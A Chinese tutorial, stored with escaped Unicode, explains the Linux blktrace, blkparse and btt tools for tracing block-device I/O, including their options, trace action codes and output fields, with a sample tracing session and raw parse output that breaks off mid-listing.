\u8fd0\u884cblktrace\u4e3a\u5ba2\u6237\u7aef\u6a21\u5f0f\uff0c-h\u540e\u9762\u52a0\u670d\u52a1\u7aef\u7684\u4e3b\u673aIP\u5730\u5740 -p Network port to use (default 8462) \u7f51\u7edc\u6a21\u5f0f\u7684\u7aef\u53e3\uff0c\u9ed8\u8ba4\u4e3a8462 -s Make the network client NOT use sendfile() to transfer data \u7f51\u7edc\u6a21\u5f0f\u4e0b\u53d1\u9001\u6570\u636e\u4e0d\u4f7f\u7528sendfile()\u7cfb\u7edf\u8c03\u7528 -I Add devices found in <devs file> \u5728\u6587\u4ef6\u4e2d\u67e5\u627e\u8bbe\u5907\uff08\u4e0d\u77e5\u9053\u4ec0\u4e48\u610f\u601d\uff09 -v Print program version info \u6253\u5370\u7248\u672c\u4fe1\u606f -V Print program version info \u6253\u5370\u7248\u672c\u4fe1\u606f \u4e00\u4e9b\u8be6\u7ec6\u7684\u89e3\u91ca -a \u53ef\u4ee5\u6dfb\u52a0\u4f5c\u4e3a\u8fc7\u6ee4\u7684\u9009\u9879 barrier: barrier attribute complete: completed by driver fs: requests issue: issued to driver pc: packet command events queue: queue operations read: read traces requeue: requeue operations sync: synchronous attribute write: write traces notify: trace messages drv_data: additional driver specific trace blktrace\u533a\u5206\u4e24\u79cd\u7c7b\u578b\u7684\u5757\u5c42\u8bf7\u6c42\uff0c\u6587\u4ef6\u7cfb\u7edf\u548cSCSI\u547d\u4ee4\u3002\u524d\u8005\u79f0\u4e3afs\u8bf7\u6c42\uff0c\u540e\u8005\u79f0\u4e3apc\u8bf7\u6c42\u3002\u6587\u4ef6\u7cfb\u7edf\u8bf7\u6c42\u662f\u6b63\u5e38\u7684\u8bfb/\u5199\u64cd\u4f5c\uff0c\u5373\u4ee5\u7ed9\u5b9a\u5927\u5c0f\u4ece\u7279\u5b9a\u78c1\u76d8\u4f4d\u7f6e\u8fdb\u884c\u4efb\u4f55\u7c7b\u578b\u7684\u8bfb\u6216\u5199\u64cd\u4f5c\u3002\u8fd9\u4e9b\u8bf7\u6c42\u901a\u5e38\u6765\u81ea\u7528\u6237\u8fdb\u7a0b\uff0c\u4f46\u4e5f\u53ef\u80fd\u7531vm\u5c06\u810f\u6570\u636e\u5237\u65b0\u5230\u78c1\u76d8\u6216\u6587\u4ef6\u7cfb\u7edf\u5c06\u8d85\u7ea7\u6216\u65e5\u5fd7\u5757\u540c\u6b65\u5230\u78c1\u76d8\u6765\u542f\u52a8\u3002pc\u8bf7\u6c42\u662fSCSI\u547d\u4ee4\u3002blktrace\u5c06\u547d\u4ee4\u6570\u636e\u5757\u4f5c\u4e3a\u6709\u6548\u8f7d\u8377\u53d1\u9001\uff0c\u4ee5\u4fbfblkparse\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u89e3\u7801\u3002 \u4e3e\u4f8b \u8981\u8ddf\u8e2a\u8bbe\u5907/ dev/sda \u4e0a\u7684 I/O \u5e76\u5c06\u8f93\u51fa\u89e3\u6790\u4e3a\u4eba\u7c7b\u53ef\u8bfb\u7684\u5f62\u5f0f\uff0c\u8bf7\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a $ blktrace -d /dev/sda -o - |blkparse -i - blkparse\u547d\u4ee4 \u8bed\u6cd5 blkparse [\u9009\u9879] \u547d\u4ee4\u9009\u9879 $ blkparse Usage: blkparse -i <file> | --input=<file> \u5fc5\u586b\u9009\u9879\uff0c\u9009\u5b9ablktrace\u7684\u8f93\u51fa\u6587\u4ef6 [ -a <action field> | --act-mask=<action field> ] \u8fc7\u6ee4\u67e5\u770b\u54ea\u79cdIO\u7c7b\u578b [ -A <action mask> | --set-mask=<action mask> ] \u901a\u8fc716\u4f4d\u63a9\u7801\u8bbe\u7f6e\u8fc7\u6ee4\u54ea\u79cd\u78c1\u76d8\u884c\u4e3a [ -b <traces> | --batch=<traces> ] \u6807\u51c6\u8f93\u5165\u8bfb\u53d6 [ -d <file> | --dump-binary=<file> ] \u4e8c\u8fdb\u5236\u8f93\u51fa\u6587\u4ef6 [ -D <dir> | --input-directory=<dir> ] blktrace\u7684\u8f93\u51fa\u6587\u4ef6\u7684\u76ee\u5f55 [ -f <format> | --format=<format> ] \u8f93\u51fa\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49\u8f93\u51fa\u54ea\u4e9b\u5217 [ -F <spec> | --format-spec=<spec> ] \u683c\u5f0f\u89c4\u8303\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49 [ -h | --hash-by-name ] \u6309\u540d\u5b57\u8fdb\u884chash [ -o <file> | --output=<file> ] \u8f93\u51fa\u6587\u4ef6 [ -O | --no-text-output ] \u65e0\u6587\u672c\u8f93\u51fa [ -q | --quiet ] \u9759\u9ed8\u8f93\u51fa [ -s | --per-program-stats ] \u6bcf\u4e2a\u7a0b\u5e8f\u7684\u7edf\u8ba1\u4fe1\u606f [ -t | --track-ios ] \u5c06\u544a\u8bc9\u60a8\u8bf7\u6c42\u6392\u961f\u3001\u8c03\u5ea6\u548c\u5b8c\u6210\u6240\u9700\u7684\u65f6\u95f4 [ -w <time> | --stopwatch=<time> ] \u4ec5\u5206\u6790\u7ed9\u5b9a\u65f6\u95f4\u95f4\u9694\u4e4b\u95f4\u7684\u6570\u636e\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\uff0c\u5982\u679c\u672a\u7ed9\u5b9a\u201cstart\u201d\uff0cblkparse\u9ed8\u8ba4\u5f00\u59cb\u65f6\u95f4\u4e3a0 [ -M | --no-msgs \u4e0d\u5c06\u6d88\u606f\u8f93\u51fa\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6 [ -v | --verbose ] \u8be6\u7ec6\u8f93\u51fa [ -V | --version ] \u8f93\u51fa\u7248\u672c -a \u8fc7\u6ee4\u67e5\u770b\u54ea\u79cdIO\u7c7b\u578b -A \u901a\u8fc716\u4f4d\u63a9\u7801\u8bbe\u7f6e\u8fc7\u6ee4\u54ea\u79cd\u78c1\u76d8\u884c\u4e3a -b \u6807\u51c6\u8f93\u5165\u8bfb\u53d6 -d \u4e8c\u8fdb\u5236\u8f93\u51fa\u6587\u4ef6 -D blktrace\u7684\u8f93\u51fa\u6587\u4ef6\u7684\u76ee\u5f55 -f \u8f93\u51fa\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49\u8f93\u51fa\u54ea\u4e9b\u5217 -F \u683c\u5f0f\u89c4\u8303\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49 -h \u6309\u8fdb\u7a0b\u540d\u5b57\u6392\u5e8f\u800c\u4e0d\u662fpid -i \u5fc5\u586b\u9009\u9879\uff0c\u9009\u5b9ablktrace\u7684\u8f93\u51fa\u6587\u4ef6, \u6216\u8005\u52a0 - \u8ddfblktrace\u547d\u4ee4\u884c\u8f93\u51fa -o \u8f93\u51fa\u6587\u4ef6\u3002\u5982\u679c\u672a\u7ed9\u51fa\uff0c\u5219\u8f93\u51fa\u4e3a\u6807\u51c6\u8f93\u51fa -O \u65e0\u6587\u672c\u8f93\u51fa -q \u9759\u9ed8\u8f93\u51fa -s \u663e\u793a\u6bcf\u4e2a\u7a0b\u5e8f\u7684io\u7edf\u8ba1\u4fe1\u606f -t \u5c06\u544a\u8bc9\u60a8\u8bf7\u6c42\u6392\u961f\u3001\u8c03\u5ea6\u548c\u5b8c\u6210\u6240\u9700\u7684\u65f6\u95f4 -w \u4ec5\u5206\u6790\u7ed9\u5b9a\u65f6\u95f4\u95f4\u9694\u4e4b\u95f4\u7684\u6570\u636e\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\uff0c\u5982\u679c\u672a\u7ed9\u5b9a\u201cstart\u201d\uff0cblkparse\u9ed8\u8ba4\u5f00\u59cb\u65f6\u95f4\u4e3a0 -M \u4e0d\u5c06\u6d88\u606f\u8f93\u51fa\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6 -v \u8be6\u7ec6\u8f93\u51fa -V \u8f93\u51fa\u7248\u672c TRACE ACTIONS \u8bc6\u522b\u4ee5\u4e0b\u8ddf\u8e2a\uff1a C -- complete A previously issued request has been completed. The output will detail the sector and size of that request, as well as the success or failure of it. D -- issued A request that previously resided on the block layer queue or in the i/o scheduler has been sent to the driver. I -- inserted A request is being sent to the i/o scheduler for addition to the internal queue and later service by the driver. The request is fully formed at this time. Q -- queued This notes intent to queue i/o at the given location. No real requests exists yet. B -- bounced The data pages attached to this bio are not reachable by the hardware and must be bounced to a lower memory location. This causes a big slowdown in i/o performance, since the data must be copied to/from kernel buffers. Usually this can be fixed with using better hardware -- either a better i/o controller, or a platform with an IOMMU. M -- back merge A previously inserted request exists that ends on the boundary of where this i/o begins, so the i/o scheduler can merge them together. F -- front merge Same as the back merge, except this i/o ends where a previously inserted requests starts. M --front or back merge One of the above M -- front or back merge One of the above. G -- get request To send any type of request to a block device, a struct request container must be allocated first. S -- sleep No available request structures were available, so the issuer has to wait for one to be freed. P -- plug When i/o is queued to a previously empty block device queue, Linux will plug the queue in anticipation of future ios being added before this data is needed. U -- unplug Some request data already queued in the device, start sending requests to the driver. This may happen automatically if a timeout period has passed (see next entry) or if a number of requests have been added to the queue. T -- unplug due to timer If nobody requests the i/o that was queued after plugging the queue, Linux will automatically unplug it after a defined period has passed. X -- split On raid or device mapper setups, an incoming i/o may straddle a device or internal zone and needs to be chopped up into smaller pieces for service. This may indicate a performance problem due to a bad setup of that raid/dm device, but may also just be part of normal boundary conditions. dm is notably bad at this and will clone lots of i/o. A -- remap For stacked devices, incoming i/o is remapped to device below it in the i/o stack. The remap action details what exactly is being remapped to what. \u8f93\u51fa\u8bf4\u660e blkparse\u7684\u8f93\u51fa\u53ef\u4ee5\u9488\u5bf9\u7279\u5b9a\u7528\u9014\u8fdb\u884c\u5b9a\u5236\uff0c\u7279\u522b\u662f\u4e3a\u4e86\u7b80\u5316\u8f93\u51fa\u89e3\u6790\uff0c\u548c/\u6216\u5c06\u8f93\u51fa\u5b57\u6bb5\u9650\u5236\u4e3a\u7528\u6237\u5e0c\u671b\u770b\u5230\u7684\u5b57\u6bb5\u3002\u53ef\u8f93\u51fa\u7684\u5b57\u6bb5\u6570\u636e\u5305\u62ec\uff1a a Action, a (small) string (1 or 2 characters) -- see table below for more details c CPU id C Command d RWBS field, a (small) string (1-3 characters) -- see section below for more details D 7-character string containing the major and minor numbers of the event's device (separated by a comma). e Error value m Minor number of event's device. M Major number of event's device. n Number of blocks N Number of bytes p Process ID P Display packet data -- series of hexadecimal values s Sequence numbers S Sector number t Time stamp (nanoseconds) T Time stamp (seconds) u Elapsed value in microseconds (-t command line option) U Payload unsigned integer \u6ce8\u610f\uff0c\u7528\u6237\u53ef\u4ee5\u9009\u62e9\u6307\u5b9a\u5b57\u6bb5\u663e\u793a\u5bbd\u5ea6\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9\u5de6\u5bf9\u9f50\u8bf4\u660e\u7b26\u3002\u5b83\u4eec\u4f4d\u4e8e\u5b57\u6bb5\u8bf4\u660e\u7b26\u4e4b\u524d\uff0c\u540e\u8ddf\u201c%\u201d\u5b57\u7b26\uff0c\u540e\u8ddf\u53ef\u9009\u7684\u5de6\u5bf9\u9f50\u8bf4\u660e\u7b26\uff08-\uff09\uff0c\u540e\u8ddf\u5bbd\u5ea6\uff08\u5341\u8fdb\u5236\u6570\uff09\uff0c\u7136\u540e\u662f\u5b57\u6bb5\u3002 \u56e0\u6b64\uff0c\u8981\u5728\u5de6\u5bf9\u9f50\u768412\u4e2a\u5b57\u7b26\u5b57\u6bb5\u4e2d\u6307\u5b9a\u547d\u4ee4\uff1a -f \"%-12C\" \u6307\u5b9a\u6bcf\u5217\u8f93\u51fa % blkparse -f \"%a %c %C %d %n %p %s %S %t \\n\" -i myvda \"%a\u8f93\u51fa\u5217\u4e2d\u6bcf\u4e2a\u5b57\u6bcd\u7684\u542b\u4e49 A IO was remapped to a different device B IO bounced C IO completion D IO issued to driver F IO front merged with request on queue G Get request I IO inserted onto request queue M IO back merged with request on queue P Plug request Q IO handled by request queue code S Sleep request T Unplug due to timeout U Unplug request X Split %d \u8f93\u51fa\u5217\u4e2d\u6bcf\u4e2a\u5b57\u6bcd\u7684\u542b\u4e49 \u8fd9\u662f\u4e00\u4e2a\u5c0f\u5b57\u7b26\u4e32\uff0c\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u5b57\u7b26\uff08\u201cR\u201d\u8868\u793a\u8bfb\u53d6\uff0c\u201cW\u201d\u8868\u793a\u5199\u5165\uff0c\u201cD\u201d\u8868\u793a\u5757\u4e22\u5f03\u64cd\u4f5c\uff09\uff0c\u4ee5\u53ca\u53ef\u9009\u7684\u201cB\u201d\uff08\u8868\u793a\u5c4f\u969c\u64cd\u4f5c\uff09\u6216\u201cS\u201d\uff08\u8868\u793a\u540c\u6b65\u64cd\u4f5c\uff09\u3002 \u9ed8\u8ba4\u8f93\u51fa \u6807\u51c6\u6807\u9898\u5305\u542b\u4e0b\u5217\u6807\u9898\uff1a \"%D %2c %8s %5T.%9t %5p %2a %3d\" btt\u547d\u4ee4 \u8bed\u6cd5 btt [\u9009\u9879] \u547d\u4ee4\u9009\u9879 [ -a | --seek-absolute ] [ -A | --all-data ] \u901a\u5e38\uff0cbtt\u4e0d\u4f1a\u6253\u5370\u6709\u5173\u6bcf\u4e2a\u8fdb\u7a0b\u548c\u6bcf\u4e2a\u8bbe\u5907\u6570\u636e\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u5982\u679c\u9700\u8981\u8be5\u8be6\u7ec6\u7ea7\u522b\uff0c\u53ef\u4ee5\u6307\u5b9a\u6b64\u9009\u9879\u3002 [ -B <output name> | --dump-blocknos=<output name> ] \u6b64\u9009\u9879\u5c06\u4ee5\u6307\u5b9a\u7684\u8f93\u51fa\u540d\u79f0\u4e3a\u524d\u7f00\u5411\u4e09\u4e2a\u6587\u4ef6\u8f93\u51fa\u7edd\u5bf9\u5757\u53f7 [ -d <seconds> | --range-delta=<seconds> ] btt\u8f93\u51fa\u4e00\u4e2a\u5305\u542bQ\u548cC\u6d3b\u52a8\u7684\u6587\u4ef6\uff0c\u6d3b\u52a8\u8ddf\u8e2a\u7684\u6982\u5ff5\u7b80\u5355\u5730\u610f\u5473\u7740\u5728\u5f7c\u6b64\u7684\u67d0\u4e2a\u65f6\u95f4\u6bb5\u5185\u5b58\u5728Q\u6216C\u8ddf\u8e2a\u3002\u9ed8\u8ba4\u503c\u4e3a0.1\u79d2\uff1b\u8be5\u9009\u9879\u5141\u8bb8\u60a8\u66f4\u6539\u7c92\u5ea6\u3002\u503c\u8d8a\u5c0f\uff0c\u63d0\u4f9b\u7684\u6570\u636e\u70b9\u8d8a\u591a\u3002 [ -D <dev;...> | --devices=<dev;...> ] \u901a\u5e38\uff0cbtt\u5c06\u4e3a\u5728\u5206\u6790\u7684\u8ddf\u8e2a\u4e2d\u68c0\u6d4b\u5230\u7684\u6240\u6709\u8bbe\u5907\u751f\u6210\u6570\u636e\u3002\u4f7f\u7528\u6b64\u9009\u9879\uff0c\u53ef\u4ee5\u5c06\u5206\u6790\u51cf\u5c11\u5230\u4f20\u9012\u7ed9\u6b64\u9009\u9879\u7684\u5b57\u7b26\u4e32\u4e2d\u63d0\u4f9b\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u8bbe\u5907 [ -e <exe,...> | --exes=<exe,...> ] -e\u9009\u9879\u63d0\u4f9b\u5c06\u5206\u6790I/O\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5217\u8868\u3002 [ -h | --help ] \u6253\u5370\u6b64\u5e2e\u52a9 [ -i <input name> | --input-file=<input name> ] \u6307\u5b9a\u8f93\u5165\u6587\u4ef6 [ -I <output name> | --iostat=<output name> ] -I\u9009\u9879\u6307\u793abtt\u5c06\u7c7b\u4f3ciostat\u7684\u6570\u636e\u8f93\u51fa\u5230\u6307\u5b9a\u7684\u6587\u4ef6\u3002\u6709\u5173\u6570\u636e\u5217\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605iostat\uff08sysstat\uff09\u6587\u6863\u3002 [ -l <output name> | --d2c-latencies=<output name> ] -l\u9009\u9879\u5141\u8bb8\u5206\u522b\u8f93\u51fa\u6bcf\u4e2aIO D2C\u5ef6\u8fdf\u3002\u63d0\u4f9b\u7684\u53c2\u6570\u4e3a\u6bcf\u4e2a\u8bbe\u5907\u7684\u8f93\u51fa\u540d\u79f0\u63d0\u4f9b\u4e86\u57fa\u7840\u3002 [ -L <freq> | --periodic-latencies=<freq> ] -L\u9009\u9879\u5141\u8bb8\u8f93\u51faQ2C\u548cD2C\u5ef6\u8fdf\u7684\u5468\u671f\u6027\u5ef6\u8fdf\u4fe1\u606f\u3002\u6307\u5b9a\u7684\u9891\u7387\u5c06\u8c03\u8282\u8f93\u51fa\u5e73\u5747\u5ef6\u8fdf\u7684\u9891\u7387\u2014\u2014\u8868\u793a\u79d2\u7684\u6d6e\u70b9\u503c\u3002 [ -m <output name> | --seeks-per-second=<output name> ] \u89e6\u53d1btt\u4ee5\u8f93\u51fa\u6bcf\u79d2\u5bfb\u9053\u4fe1\u606f\u3002\u7b2c\u4e00\u5217\u5c06\u5305\u542b\u65f6\u95f4\u503c\uff08\u79d2\uff09\uff0c\u7b2c\u4e8c\u5217\u5c06\u6307\u793a\u6b64\u65f6\u6bcf\u79d2\u7684\u5bfb\u9053\u6b21\u6570\u3002 [ -M <dev map> | --dev-maps=<dev map> [ -o <output name> | --output-file=<output name> ] \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u540d\u3002 [ -p <output name> | --per-io-dump=<output name> ] -p\u9009\u9879\u5c06\u751f\u6210\u4e00\u4e2a\u5305\u542b\u6240\u6709IO\u201c\u5e8f\u5217\u201d\u5217\u8868\u7684\u6587\u4ef6\uff0c\u663e\u793a\u6bcf\u4e2aIO\u7684\u90e8\u5206\uff08Q\u3001a\u3001I/M\u3001D\u548cC\uff09\u3002 [ -P <output name> | --per-io-trees=<output name> ] -P\u9009\u9879\u5c06\u751f\u6210\u4e00\u4e2a\u5305\u542b\u6240\u6709IO\u201c\u5e8f\u5217\u201d\u5217\u8868\u7684\u6587\u4ef6\uff0c\u4ec5\u663e\u793aQ\u3001D\u548cC\u64cd\u4f5c\u65f6\u95f4\u3002D&C\u65f6\u95f4\u503c\u4e0eQ\u65f6\u95f4\u503c\u7528\u7ad6\u6761\u9694\u5f00\u3002 [ -q <output name> | --q2c-latencies=<output name> ] -q\u9009\u9879\u5141\u8bb8\u5206\u522b\u8f93\u51fa\u6bcf\u4e2aIO Q2C\u5ef6\u8fdf\u3002\u63d0\u4f9b\u7684\u53c2\u6570\u4e3a\u6bcf\u4e2a\u8bbe\u5907\u7684\u8f93\u51fa\u540d\u79f0\u63d0\u4f9b\u4e86\u57fa\u7840\u3002 [ -Q <output name> | --active-queue-depth=<output name> ] -Q\u9009\u9879\u5141\u8bb8\u8f93\u51fa\u663e\u793a\u65f6\u95f4\u6233\u548c\u6d3b\u52a8\u547d\u4ee4\u6df1\u5ea6\uff08\u5df2\u53d1\u51fa\u4f46\u5c1a\u672a\u5b8c\u6210\u7684\u547d\u4ee4\uff09\u7684\u6570\u636e\u6587\u4ef6\u3002 [ -r | --no-remaps ] \u5ffd\u7565\u91cd\u6620\u5c04\u8ddf\u8e2a\uff1b\u8f83\u65e7\u7684\u5185\u6838\u6ca1\u6709\u5b9e\u73b0\u5b8c\u6574\u7684\u91cd\u6620\u5c04PDU\u3002 [ -s <output name> | --seeks=<output name> ] -s\u9009\u9879\u6307\u793abtt\u8f93\u51fa\u641c\u7d22\u6570\u636e\uff0c\u63d0\u4f9b\u7684\u53c2\u6570\u662f\u6587\u4ef6\u540d\u8f93\u51fa\u7684\u57fa\u7840\u3002\u6bcf\u4e2a\u8bbe\u5907\u6709\u4e24\u4e2a\u6587\u4ef6\uff0c\u8bfb\u67e5\u627e\u548c\u5199\u67e5\u627e\u3002 [ -S <interval> | --iostat-interval=<interval> ] -S\u9009\u9879\u6307\u5b9a\u6570\u636e\u8f93\u51fa\u4e4b\u95f4\u4f7f\u7528\u7684\u95f4\u9694\uff0c\u9ed8\u8ba4\u4e3a\u6bcf\u79d2\u4e00\u6b21\u3002 [ -t <sec> | --time-start=<sec> ] \u5206\u6790\u7684\u5f00\u59cb\u65f6\u95f4 [ -T <sec> | --time-end=<sec> ] \u5206\u6790\u7684\u7ed3\u675f\u65f6\u95f4 [ -u <output name> | --unplug-hist=<output name> ] \u8f93\u51fa\u76f4\u65b9\u56fe [ -V | --version ] \u7248\u672c\u4fe1\u606f [ -v | --verbose ] \u8be6\u7ec6\u4fe1\u606f [ -X | --easy-parse-avgs ] \u4ee5\u6613\u4e8e\u89e3\u6790\u7684\u5f62\u5f0f\u63d0\u4f9b\u6570\u636e\uff0c\u5e76\u5c06\u5176\u5199\u5165\u5e26\u6709.avg exentsion\u7684\u6587\u4ef6 [ -z <output name> | --q2d-latencies=<output name> ] -z\u9009\u9879\u5141\u8bb8\u5206\u522b\u8f93\u51fa\u6bcf\u4e2aIO Q2D\u5ef6\u8fdf\u3002\u63d0\u4f9b\u7684\u53c2\u6570\u4e3a\u6bcf\u4e2a\u8bbe\u5907\u7684\u8f93\u51fa\u540d\u79f0\u63d0\u4f9b\u4e86\u57fa\u7840\u3002 [ -Z | --do-active -Z\u5c06\u8f93\u51fa\u5305\u542b\u6570\u636e\u7684\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6570\u636e\u53ef\u4ee5\u7ed8\u5236\u4e3a\u663e\u793a\u6bcf\u4e2a\u8bbe\u5907\uff08\u548c\u6574\u4e2a\u7cfb\u7edf\uff09\u7684I/O\u6d3b\u52a8\u3002 \u8ffd\u8e2avda\u78c1\u76d810\u79d2\u949f\uff0c\u6307\u5b9a\u76ee\u5f55\u5230mydata\uff0c\u6587\u4ef6\u540d\u4e3amyvda\uff0cblkparse \u6307\u5b9a\u8f93\u5165myvda \uff0c\u8f93\u51fa\u4e8c\u8fdb\u5236\u62a5\u544a\u5728myvdabin\u4e2d\uff0cbtt \u8f93\u5165\u4e8c\u8fdb\u5236\u62a5\u544amyvdabin\uff0c\u8f93\u51faiostat\u4fe1\u606f\u5728iostatreport\u4e2d\uff0c\u62a5\u544a\u6253\u5370\u5728\u5c4f\u5e55\u4e0a [root@VM-0-16-centos blk]# blktrace -d /dev/vda -w 10 -D mydata -o myvda === vda === CPU 0: 391 events, 19 KiB data CPU 1: 246 events, 12 KiB data CPU 2: 0 events, 0 KiB data CPU 3: 17 events, 1 KiB data Total: 654 events (dropped 0), 31 KiB data [root@VM-0-16-centos blk]# ls mydata [root@VM-0-16-centos blk]# cd mydata/ [root@VM-0-16-centos mydata]# ls myvda.blktrace.0 myvda.blktrace.1 myvda.blktrace.2 myvda.blktrace.3 [root@VM-0-16-centos mydata]# blkparse -i myvda -d myvdabin Input file myvda.blktrace.0 added Input file myvda.blktrace.1 added Input file myvda.blktrace.2 added 253,0 0 1 0.000000000 31360 A WS 18285248 + 8 <- (253,1) 18283200 253,0 0 2 0.000002963 31360 Q WS 18285248 + 8 [barad_agent] 253,0 0 3 0.000005948 31360 G WS 18285248 + 8 [barad_agent] 253,0 0 4 0.000008960 31360 P N [barad_agent] 253,0 0 5 0.000011457 31360 UT N [barad_agent] 1 253,0 0 6 0.000012926 31360 I WS 18285248 + 8 [barad_agent] 253,0 0 7 0.000016476 31360 D WS 18285248 + 8 [barad_agent] 253,0 0 8 0.000910827 0 C WS 18285248 + 8 [0] 253,0 1 1 0.000960226 291 A WS 7928704 + 8 <- (253,1) 7926656 253,0 1 2 0.000961174 291 Q WS 7928704 + 8 [jbd2/vda1-8] 253,0 1 3 0.000962002 291 G WS 7928704 + 8 [jbd2/vda1-8] 253,0 1 4 0.000963025 291 P N [jbd2/vda1-8] 253,0 1 5 0.000963520 291 A WS 7928712 + 8 <- (253,1) 7926664 253,0 1 6 0.000963743 291 Q WS 7928712 + 8 [jbd2/vda1-8] 253,0 1 7 0.000964425 291 M WS 7928712 + 8 [jbd2/vda1-8] 253,0 1 8 0.000964942 291 A WS 7928720 + 8 <- (253,1) 7926672 253,0 1 9 0.000965136 291 Q WS 7928720 + 8 [jbd2/vda1-8] 253,0 1 10 0.000965273 291 M WS 7928720 + 8 [jbd2/vda1-8] 253,0 1 11 0.000965616 291 A WS 7928728 + 8 <- (253,1) 7926680 253,0 1 12 0.000965733 291 Q WS 7928728 + 8 [jbd2/vda1-8] 253,0 1 13 0.000965867 291 M WS 7928728 + 8 [jbd2/vda1-8] 253,0 1 14 0.000966134 291 A WS 7928736 + 8 <- (253,1) 7926688 253,0 1 15 0.000966253 291 Q WS 7928736 + 8 [jbd2/vda1-8] 253,0 1 16 0.000966385 291 M WS 7928736 + 8 [jbd2/vda1-8] 253,0 1 17 0.000966664 291 A WS 7928744 + 8 <- (253,1) 7926696 253,0 1 18 0.000966781 291 Q WS 7928744 + 8 [jbd2/vda1-8] 253,0 1 19 0.000966910 291 M WS 7928744 + 8 [jbd2/vda1-8] 253,0 1 20 0.000967197 291 A WS 7928752 + 8 <- (253,1) 7926704 253,0 1 21 0.000967316 291 Q WS 7928752 + 8 [jbd2/vda1-8] 253,0 1 22 0.000967450 291 M WS 7928752 + 8 [jbd2/vda1-8] 253,0 1 23 0.000967645 291 A WS 7928760 + 8 <- (253,1) 7926712 253,0 1 24 0.000967763 291 Q WS 7928760 + 8 [jbd2/vda1-8] 253,0 1 25 0.000967894 291 M WS 7928760 + 8 [jbd2/vda1-8] 253,0 1 26 0.000968162 291 A WS 7928768 + 8 <- (253,1) 7926720 253,0 1 27 0.000968281 291 Q WS 7928768 + 8 [jbd2/vda1-8] 253,0 1 28 0.000968411 291 M WS 7928768 + 8 [jbd2/vda1-8] 253,0 1 29 0.000968771 291 A WS 7928776 + 8 <- (253,1) 7926728 253,0 1 30 0.000968894 291 Q WS 7928776 + 8 [jbd2/vda1-8] 253,0 1 31 0.000969027 291 M WS 7928776 + 8 [jbd2/vda1-8] 253,0 1 32 0.000969474 291 A WS 7928784 + 8 <- (253,1) 7926736 253,0 1 33 0.000969599 291 Q WS 7928784 + 8 [jbd2/vda1-8] 253,0 1 34 0.000969731 291 M WS 7928784 + 8 [jbd2/vda1-8] 253,0 1 35 0.000970010 291 A WS 7928792 + 8 <- (253,1) 7926744 253,0 1 36 0.000970129 291 Q WS 7928792 + 8 [jbd2/vda1-8] 253,0 1 37 0.000970259 291 M WS 7928792 + 8 [jbd2/vda1-8] 253,0 1 38 0.000970541 291 A WS 7928800 + 8 <- (253,1) 7926752 253,0 1 39 0.000970665 291 Q WS 7928800 + 8 [jbd2/vda1-8] 253,0 1 40 0.000970796 291 M WS 7928800 + 8 [jbd2/vda1-8] 253,0 1 41 0.000971068 291 A WS 7928808 + 8 <- (253,1) 7926760 253,0 1 42 0.000971188 291 Q WS 7928808 + 8 [jbd2/vda1-8] 253,0 1 43 0.000971317 291 M WS 7928808 + 8 [jbd2/vda1-8] 253,0 1 44 0.000971590 291 A WS 7928816 + 8 <- (253,1) 7926768 253,0 1 45 0.000971710 291 Q WS 7928816 + 8 [jbd2/vda1-8] 253,0 1 46 0.000971841 291 M WS 7928816 + 8 [jbd2/vda1-8] 253,0 1 47 0.000972114 291 A WS 7928824 + 8 <- (253,1) 7926776 253,0 1 48 0.000972234 291 Q WS 7928824 + 8 [jbd2/vda1-8] 253,0 1 49 0.000972363 291 M WS 7928824 + 8 [jbd2/vda1-8] 253,0 1 50 0.000972626 291 A WS 7928832 + 8 <- (253,1) 7926784 253,0 1 51 0.000972819 291 Q WS 7928832 + 8 [jbd2/vda1-8] 253,0 1 52 0.000972952 291 M WS 7928832 + 8 [jbd2/vda1-8] 253,0 1 53 0.000973204 291 A WS 7928840 + 8 <- (253,1) 7926792 253,0 1 54 0.000973397 291 Q WS 7928840 + 8 [jbd2/vda1-8] 253,0 1 55 0.000973527 291 M WS 7928840 + 8 [jbd2/vda1-8] 253,0 1 56 0.000973751 291 A WS 7928848 + 8 <- (253,1) 7926800 253,0 1 57 0.000973930 291 Q WS 7928848 + 8 [jbd2/vda1-8] 253,0 1 58 0.000974059 291 M WS 7928848 + 8 [jbd2/vda1-8] 253,0 1 59 0.000974318 291 A WS 7928856 + 8 <- (253,1) 7926808 253,0 1 60 0.000974500 291 Q WS 7928856 + 8 [jbd2/vda1-8] 253,0 1 61 0.000974633 291 M WS 7928856 + 8 [jbd2/vda1-8] 253,0 1 62 0.000974857 291 A WS 7928864 + 8 <- (253,1) 7926816 253,0 1 63 0.000974977 291 Q WS 7928864 + 8 [jbd2/vda1-8] 253,0 1 64 0.000975108 291 M WS 7928864 + 8 [jbd2/vda1-8] 253,0 1 65 0.000975302 291 A WS 7928872 + 8 <- (253,1) 7926824 253,0 1 66 0.000975418 291 Q WS 7928872 + 8 [jbd2/vda1-8] 253,0 1 67 0.000975547 291 M WS 7928872 + 8 [jbd2/vda1-8] 253,0 1 68 0.000976171 291 A WS 7928880 + 8 <- (253,1) 7926832 253,0 1 69 0.000976289 291 Q WS 7928880 + 8 [jbd2/vda1-8] 253,0 1 70 0.000976421 291 M WS 7928880 + 8 [jbd2/vda1-8] 253,0 1 71 0.000976707 291 A WS 7928888 + 8 <- (253,1) 7926840 253,0 1 72 0.000976823 291 Q WS 7928888 + 8 [jbd2/vda1-8] 253,0 1 73 0.000976951 291 M WS 7928888 + 8 [jbd2/vda1-8] 253,0 1 74 0.000977235 291 A WS 7928896 + 8 <- (253,1) 7926848 253,0 1 75 0.000977351 291 Q WS 7928896 + 8 [jbd2/vda1-8] 253,0 1 76 